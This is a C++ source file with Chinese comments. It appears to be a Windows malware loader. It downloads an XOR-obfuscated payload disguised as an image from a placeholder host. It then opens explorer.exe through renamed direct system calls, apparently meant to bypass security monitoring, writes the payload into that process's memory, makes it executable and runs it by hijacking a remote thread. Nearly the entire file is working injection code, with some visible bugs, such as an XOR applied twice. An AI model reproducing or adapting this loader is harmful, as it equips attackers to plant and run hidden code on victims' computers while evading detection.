#include <Windows.h>
#include <TlHelp32.h>
#include <tchar.h>
#include <stdio.h>
#include "syscalls.h"
#include <iostream>
#include <iostream>
#include <string>
#include <vector>
#include <memory>
#include <wininet.h>

using namespace std;

unsigned char pp[4096];
void dt(unsigned char* data, int len, int key)
{
    for (int i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

DWORD CALLBACK handle_response(HINTERNET hInternet, DWORD_PTR dwContext, DWORD dwInternetStatus,
    LPVOID lpvStatusInformation, DWORD dwStatusInformationLength)
{
    // 获取下载的数据
    DWORD data_len = dwStatusInformationLength;
    unsigned char* img_data = reinterpret_cast<unsigned char*>(lpvStatusInformation);

    // 解密操作
    int key = 0x12;
    dt(img_data + 0x100, data_len - 0x100, key);
    dt(img_data + 0x100, data_len - 0x100, key);

    // 将解密后的数据传递给全局变量
    memcpy(pp, img_data + 0x100, data_len - 0x100);

    // 打印解密后的数据
    /*
    std::cout << "Decrypted data:" << std::endl;
    for (DWORD i = 0; i < data_len - 0x100; i++) {
        printf("%02x", pp[i]);
    }
    std::cout << std::endl;
    */
    return 0;
}

int main(int argc, char* argv[]) {
    HANDLE hProcess = NULL;
    SIZE_T bytesWritten = 0;
    LPVOID remoteMem = NULL;


    // 初始化WinINet
    HINTERNET hInternet = InternetOpen(L"HTTP Example", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        std::cerr << "InternetOpen failed: " << GetLastError() << std::endl;
        return 1;
    }

    // 打开URL
    HINTERNET hUrl = InternetOpenUrl(hInternet, L"http://x.x.x.x/test.jpg", NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hUrl == NULL) {
        std::cerr << "InternetOpenUrl failed: " << GetLastError() << std::endl;
        InternetCloseHandle(hInternet);
        return 1;
    }

    // 读取HTTP响应数据
    DWORD bytesRead = 0;
    BYTE buffer[4096];
    BOOL bResult = InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead);
    if (bResult == FALSE) {
        std::cerr << "InternetReadFile failed: " << GetLastError() << std::endl;
        InternetCloseHandle(hUrl);
        InternetCloseHandle(hInternet);
        return 1;
    }

    // 处理HTTP请求返回的数据
    handle_response(hUrl, 0, INTERNET_STATUS_RECEIVING_RESPONSE, buffer, bytesRead);

    // 关闭URL和WinINet
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);
  
    // Find the explorer.exe process
    DWORD pid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process;
    process.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(snapshot, &process)) {
        do {
            if (!_wcsicmp(process.szExeFile, L"explorer.exe")) {
                pid = process.th32ProcessID;
                break;
            }
        } while (Process32Next(snapshot, &process));
    }

    if (pid) {
        //std::cout << "PID of explorer.exe is " << pid << std::endl;
    }
    else {
        std::cout << "explorer.exe is not running." << std::endl;
    }

    CloseHandle(snapshot);

    if (pid == 0)
    {
        //printf("Explorer.exe process not found!\n");
        return 1;
    }
    // Open the process
    hProcess = NULL;
    OBJECT_ATTRIBUTES oa = { 0 };
    CLIENT_ID cid = { 0 };
    cid.UniqueProcess = (HANDLE)pid;
    NTSTATUS status = VegexOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid);
    if (hProcess == NULL)
    {
        printf("Failed to open process with error: 0x%x\n", status);
        return 1;
    }

    PVOID remoteAddr = NULL;
    SIZE_T sDataSize = 0x60000;
    VegexAllocateVirtualMemory(hProcess, &remoteAddr, 0, &sDataSize, MEM_COMMIT, PAGE_READWRITE);


   
    if (remoteAddr == NULL) {
        std::cout << "Failed to allocate memory in remote process" << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    VegexWriteVirtualMemory(hProcess, remoteAddr, pp, sizeof(pp), NULL);
    ULONG ulOldProtect = 0;
    VegexProtectVirtualMemory(hProcess, &remoteAddr, &sDataSize, PAGE_EXECUTE_READ, &ulOldProtect);


    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteAddr, NULL, 0, NULL); // 创建远程线程
  
    DWORD previousSuspendCount = 0;
    VegexSuspendThread(hThread, &previousSuspendCount); // 暂停主线程
    if (hThread == NULL) {
        printf("Failed to create remote thread\n");
        return 1;
    }

    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_CONTROL;
    VegexGetContextThread(hThread, &ctx); // 获取主线程上下文

    ctx.Rip = (DWORD)remoteAddr; // 修改 EIP 寄存器的值为 shellcode 的地址

    VegexSetContextThread(hThread, &ctx);
    

    VegexResumeThread(hThread, &previousSuspendCount); // 恢复主线程

    return 0;
}
